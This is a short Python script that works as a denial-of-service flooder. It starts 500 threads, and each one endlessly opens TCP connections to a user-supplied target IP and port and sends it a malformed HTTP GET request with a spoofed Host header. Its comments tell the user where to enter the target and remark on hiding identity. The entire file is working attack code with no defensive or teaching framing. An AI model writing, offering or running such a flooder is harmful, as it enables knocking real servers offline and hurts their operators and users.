import threading
import socket

    # This is where you will input the target IP and port
target = ''
port = 0

    #if you would like, you can also try and use a fake_ip, this will not help hide your identity however.
fake_ip = ''

already_connected = 0

def startattack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global already_connected
        already_connected += 1 
        if already_connected % 500 == 0:
            print(already_connected)

for i in range(500):
    thread = threading.Thread(target=startattack)
    thread.start()